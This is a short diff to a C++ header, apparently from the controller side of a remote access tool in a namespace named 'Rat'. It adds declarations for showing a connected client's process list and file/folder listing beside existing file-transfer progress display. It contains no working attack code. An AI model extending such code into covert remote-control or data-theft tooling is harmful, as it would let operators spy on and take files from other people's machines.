@@ -47,6 +47,12 @@ namespace Rat
         static void displayProgress(uint64_t client_id, const std::string& ip, const std::string& filename, 
                                    uint64_t sequence_number, uint64_t total_chunks);
         static void resetHeaderDisplayed();
+
+        // Display processes list
+        static void displayProcessList(uint64_t client_id, const std::string& ip, const std::string& process_data);
+
+        // Display file and folder 
+        static void displayFileFolderList(uint64_t client_id, const std::string& ip_id, const std::string& file_folder_list);
     private:
         // Structure to store progress information for each client
         struct ProgressInfo 
